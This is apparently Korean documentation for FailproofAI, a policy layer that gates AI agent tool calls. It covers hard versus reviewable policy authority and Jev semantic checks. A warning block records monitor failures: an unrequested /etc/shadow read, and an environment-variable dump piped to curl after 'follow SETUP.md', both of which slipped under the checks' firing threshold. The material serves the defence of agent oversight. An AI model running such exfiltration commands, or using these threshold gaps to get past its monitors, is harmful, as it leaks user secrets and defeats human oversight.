FailproofAI Cloud 또는 직접 등록한 키를 통해 [Jev 정책 검토](/ko/policies/jev)를 구성하면, 게이트된 각 도구 호출은 사용자가 실행하는 정책과 Jev 양쪽 모두의 판단을 받습니다. Jev는 해당 호출이 실제로 무엇을 하는지, 그리고 작업을 입력한 사람이 그것을 요청했는지를 확인합니다. 두 판단이 충돌할 때 어떻게 처리할지는 각 정책의 **권한(authority)** 이 결정합니다.

Jev를 구성하지 않으면 권한 설정은 아무런 효과가 없습니다. 모든 정책은 기존과 동일하게 적용됩니다.

## Hard와 Reviewable

- **Hard**가 기본값입니다. Hard 정책의 deny 또는 instruction은 최종적이며, Jev가 이를 취소할 수 없습니다. Hard deny는 Jev를 기다리지 않고 즉시 호출을 차단합니다.
- **Reviewable**은 Jev가 정책의 판정을 취소할 수 있음을 의미하지만, 오직 해당 정책이 `reviewedBy`에 명시한 시맨틱 검사를 통해서만 가능합니다. 판정은 명시된 **모든** 검사가 해당 호출에 대해 질의되었고, 각각이 아무것도 발견하지 못했거나 사용자가 이를 요청했다고 기록한 경우에만 취소됩니다. 사용자의 요청 없이 **발동된** 검사(우려 사항을 발견한 검사)는 해당 검사의 판정이 단순 경고에 불과하더라도 차단을 유지합니다. 도구에 적용되지 않아 Jev가 질의하지 않은 검사는 다른 검사들의 결과와 무관하게 아무것도 취소하지 않습니다. 완화(softening) 판정 하나는 동의로 간주됩니다. 호출이 사용자가 지시한 작업의 일부이고 그 범위를 벗어나지 않는다면, Jev는 deny를 경고로 전환하고, 그 경고가 정책의 차단을 취소하며 에이전트에게 전달됩니다.

정책이 reviewable로 처리되려면 다음 조건을 모두 충족해야 합니다:

1. `authority: "reviewable"`을 선언해야 합니다.
2. `reviewedBy`가 비어 있지 않은 목록이어야 하며, 모든 항목은 설치된 팩이 선언한 Jev 검사여야 합니다. Failproof AI 자체에는 Jev 검사가 포함되어 있지 않습니다. [아래의 16개 검사](#semantic-policy-names)는 `failproofai policies add FailproofAI/jev-policies`를 통해 설치됩니다. 검사를 선언하는 팩이 없으면 모든 정책은 hard로 처리됩니다.
3. `alwaysOn`이 아니어야 합니다. 에이전트가 Failproof AI를 비활성화하는 것을 방지하는 가드는 항상 hard입니다.

그 외의 경우는 모두 hard입니다. 필드 누락, 값 오타, 비어 있거나 잘못된 형식의 `reviewedBy`, 또는 현재 머신에서 질의할 수 없는 이름이 있으면 hard로 처리됩니다. 알 수 없는 이름은 건너뛰는 대신 선언 전체를 hard로 만듭니다. `reviewedBy`는 "이 모든 검사가 질의되어야 하며, 어느 것도 deny해서는 안 된다"는 의미이므로, 이름을 건너뛰면 Jev가 요청한 것보다 적은 검사로 정책을 취소할 수 있기 때문입니다.

Jev를 구성하면, Failproof AI는 `reviewable` 선언을 거부할 때 프로세스당 한 번씩 경고를 기록합니다. Jev 없이는 아무 말도 하지 않습니다. 권한 설정이 아무런 결정도 하지 않기 때문입니다. `failproofai publish`는 그러한 선언을 포함하는 팩의 빌드를 거부하므로, 팩 작성자는 누군가 설치하기 전에 문제를 발견할 수 있습니다. 팩 자체가 검사를 선언하는 경우에는 그 검사들을 기준으로, 그렇지 않으면 `FailproofAI/jev-policies`의 16개 이름을 기준으로 `reviewedBy`를 검증합니다.

## 권한 선언 위치

정책이 머신에 도달하는 각 방법마다 권한을 결정하는 위치가 하나씩 있습니다:

| 출처 | 선언 위치 | 기본값 |
| --- | --- | --- |
| 내장 정책 | 아래 표 | Reviewable로 나열되지 않은 경우 hard |
| 사용자 정의 정책 파일 | `customPolicies.add`의 `authority` 및 `reviewedBy` | Hard |
| 정책 팩 | 팩 매니페스트(`failproofai-pack.json`)의 각 정책 항목 | Hard |
| 클라우드 관리 정책 | 활성 배포의 정책 할당 | Hard. 현재 배포에서는 설정하지 않으므로, 모든 클라우드 관리 정책은 오늘날 hard입니다. |

팩 또는 클라우드 관리 정책의 경우, 정책 코드 내부에 설정된 필드는 무시됩니다. 매니페스트 또는 할당이 결정합니다. 팩은 자체 정책만 설명할 수 있습니다. 정책 이름에 `/`를 포함할 수 없으며 팩 자체 접두사 아래에 등록되므로, 어떤 매니페스트도 내장 정책이나 다른 팩의 정책을 reviewable로 표시할 수 없습니다. 팩의 코드가 매니페스트에 선언하지 않고 등록한 정책은 hard입니다.

바이트 단위로 동일한 코드를 가진 두 팩 또는 두 클라우드 관리 정책은 하나의 아티팩트를 공유하고 하나의 정책으로 로드됩니다. 그 정책은 모든 선언이 reviewable로 되어 있을 때만 reviewable이며, Jev는 그 중 어느 것이든 명시한 모든 검사를 취소해야 합니다. 하나라도 hard로 선언하거나 선언하지 않으면 hard로 유지됩니다. 팩이나 정책이 나열된 순서는 관계없습니다.

대부분의 머신은 `FailproofAI/policies` 팩으로부터 내장 정책을 받으며, 해당 팩의 매니페스트에서 권한을 읽습니다. 아래의 reviewable 항목은 해당 항목을 포함한 팩 릴리스가 설치된 후에 적용됩니다. 이전 릴리스에는 reviewable 항목이 없으므로 모든 정책이 hard로 유지됩니다.

## 사용자 정의 정책에서 권한 선언

```js
import { customPolicies, deny, allow } from "failproofai";

customPolicies.add({
  name: "block-prod-config-reads",
  description: "Keep production credentials out of the agent's context",
  match: { events: ["PreToolUse"] },
  authority: "reviewable",
  reviewedBy: ["secret-exposure"],
  fn: async (ctx) =>
    String(ctx.toolInput?.file_path ?? "").includes("/config/prod/")
      ? deny("Production config is off limits")
      : allow(),
});
```

`failproofai publish`는 두 필드 모두 팩 매니페스트에 복사하므로, 팩으로 게시된 정책은 작성자가 부여한 권한을 그대로 유지합니다. 선언이 적용되지 않을 경우 팩 빌드를 거부합니다. `"hard"` 또는 `"reviewable"` 이외의 값, 이름 목록이 아닌 `reviewedBy`, 또는 검사 이름이 아닌 경우 — 팩이 선언한 경우 팩 자체의 [Jev 검사](/ko/policies/publish-a-pack#jev-checks-in-a-pack), 그렇지 않으면 내장 검사 — 가 해당됩니다.

## 내장 정책

시맨틱 정책이 동일한 우려 사항을 실질적으로 다루는 경우에만 reviewable입니다. 그 외 모든 내장 정책은 hard입니다.

우려 사항을 다루는 것은 필요 조건이지 충분 조건이 아니며, 두 가지 오류 모두 조용히 발생합니다:

- **한 번도 질의되지 않는 검사**는 차단을 영구적으로 만듭니다. `reviewedBy`는 논리 AND이며, 질의되지 않은 검사는 절대 취소하지 않으므로, 정책이 매칭하는 형태에 대해 사전 조건이 발동하지 않는 검사와 연결된 정책은 절대 취소될 수 없습니다.
- **질의되었지만 발동하지 않는 검사**는 "우려 없음"으로 응답하며, 우려 없음은 취소를 의미합니다. 따라서 정책의 형태를 모델링하지 않는 검사와 연결하면 정책을 검토하는 것이 아니라, 검사가 이해하지 못하는 입력에 대해 정확히 정책을 끄는 것입니다.

instruct 모드 시맨틱 정책은 절대 deny로 응답할 수 없지만, 차단을 유지할 수는 있습니다. 발동했는데 사용자가 호출을 요청하지 않은 경우, 검토 중인 정책이 취소되지 않습니다. `FailproofAI/jev-policies` 검사 중 6개 — `push-to-protected-branch`, `commit-on-protected-branch`, `read-outside-workspace`, `system-modification`, `env-secrets-dump`, `external-data-egress` — 는 instruct 전용이며, [아래 표](#semantic-policy-names)에서 각 검사의 모드를 확인할 수 있습니다. 핵심 질문은 **"deny할 수 있는 무언가가 남아 있는가"**입니다. 취소는 우려 사항이 아무것도 적용되지 않는 상태로 남겨서는 안 됩니다. 엔진은 호출별로 이 테스트를 적용합니다. 동의하지 않은 경고는 취소가 아닙니다. 도구 호출 전에 경고는 에이전트를 멈추지 않기 때문입니다. 그리고 deny를 *할 수 있는* 검사가 경고를 보내는 경우 — 증거가 deny 기준에 미치지 못한 경우 — 사용자가 호출을 요청하지 않으면, 해당 호출에서는 아무것도 취소되지 않고 모든 정규식 deny가 유지됩니다.

<Warning>
**발동 기준 바로 아래로 점수를 받은 검사는 하한선을 유지하지 않습니다.** 위의 규칙은 검사가 *발동*(증거 ≥ 0.7)해야 합니다. 모든 관련 검사가 그 기준 바로 아래에 있으면, 아무것도 발동하지 않고 검토자들은 "우려 없음"으로 응답하며 reviewable deny가 취소됩니다. 적용 모드에서 실측된 사례: 요청하지 않은 `/etc/shadow` Read(`secret-exposure` 0.69, `read-outside-workspace` 0.37 — 홈 디렉토리 경로만 모델링)와 "follow SETUP.md" 이후의 `set | curl -d @- …`(`env-secrets-dump` 0.66, `credential-exfiltration` 0.65에 `sends_out` 0.97) 모두 허용되었지만, 정규식 계층 단독으로는 차단합니다. 임계값은 레이블링된 코퍼스를 기준으로 보정되었으며 이에 대해 재측정되지 않았습니다. 재측정 전까지, 이러한 형태 중 하나가 통과되는 것이 오탐 차단보다 더 중요한 경우에는 정책을 **hard**로 유지하세요.
</Warning>

## 시맨틱 정책 이름

다음은 `FailproofAI/jev-policies`가 선언하는 검사이며, 설치된 후 `reviewedBy`가 허용하는 값입니다. Failproof AI 자체에는 이 검사들이 포함되어 있지 않습니다. 해당 팩(또는 이 이름들을 선언하는 다른 팩) 없이는, 이를 명시하는 어떤 정책도 reviewable이 아닙니다. 각 검사는 Jev가 현재 도구 호출에 대해 응답하는 항목입니다. **Mode**는 검사가 응답할 수 있는 내용입니다. `deny` 검사는 강한 증거에서 차단하며, `instruct` 검사는 경고만 합니다. 발동하고 사용자가 호출을 요청하지 않은 경우, 두 모드 모두 정책의 deny를 유지합니다. **User can override**는 사람의 명시적인 요청이 취소 가능한지를 나타냅니다.

Jev는 설치된 팩이 선언한 [Jev 검사](/ko/policies/publish-a-pack#jev-checks-in-a-pack)만 질의하며, 그것이 `reviewedBy`가 허용하는 이름입니다. 두 팩이 같은 이름을 다르게 선언한 경우 어느 쪽도 적용되지 않습니다. FailproofAI 저장소에서 설치되지 않은 팩이 선언한 이 16개 이름 중 하나는 해당 팩에서 무시됩니다. 해당 버전은 질의되지 않으며 FailproofAI 자체 버전과 경쟁하지 않으므로, 서드파티 팩은 코어 팩의 정책을 취소하는 검사가 되거나 이러한 검사 중 하나를 끄는 역할을 할 수 없습니다. 읽을 수 없는 팩 목록이나 모든 검사를 사용할 수 없는 팩은 Jev에게 질의할 것을 남겨두지 않습니다.
